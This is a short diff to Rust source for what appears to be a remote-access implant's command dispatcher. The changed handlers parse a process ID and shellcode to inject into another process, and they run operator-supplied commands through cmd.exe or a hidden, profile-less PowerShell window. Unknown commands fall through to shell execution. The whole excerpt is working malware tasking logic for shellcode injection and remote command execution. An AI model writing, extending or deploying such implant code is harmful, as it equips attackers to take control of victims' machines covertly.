@@ -69,14 +69,24 @@ fn dispatch(command: &str, parameters: &str) -> String {
         "ps" => list_processes(),
         "netstat" => list_network_connections(),
         "integrity" => integrity_level(),
-        "inject" => inject_cmd(parameters),
-        "cmd" => shell_exec("cmd.exe", &["/C", parameters]),
-        "powershell" => shell_exec(
-            "powershell.exe",
-            &["-noP", "-sta", "-w", "1", "-c", parameters],
-        ),
-        "shell" => shell_exec("cmd.exe", &["/C", parameters]),
-        _ => shell_exec("cmd.exe", &["/C", parameters]),
+        "inject" => {
+            let pid = link_common::extract_param(parameters, "pid");
+            let sc = link_common::extract_param(parameters, "shellcode");
+            inject_cmd(&format!("{} {}", pid, sc))
+        }
+        "cmd" | "powershell" | "shell" => {
+            let cmd = link_common::extract_param(parameters, "command");
+            let cmd_str = if cmd.is_empty() { parameters } else { &cmd };
+            if command == "powershell" {
+                shell_exec("powershell.exe", &["-noP", "-sta", "-w", "1", "-c", cmd_str])
+            } else {
+                shell_exec("cmd.exe", &["/C", cmd_str])
+            }
+        }
+        _ => {
+            let cmd = link_common::extract_param(parameters, "command");
+            shell_exec("cmd.exe", &["/C", if cmd.is_empty() { parameters } else { &cmd }])
+        }
     }
 }
 
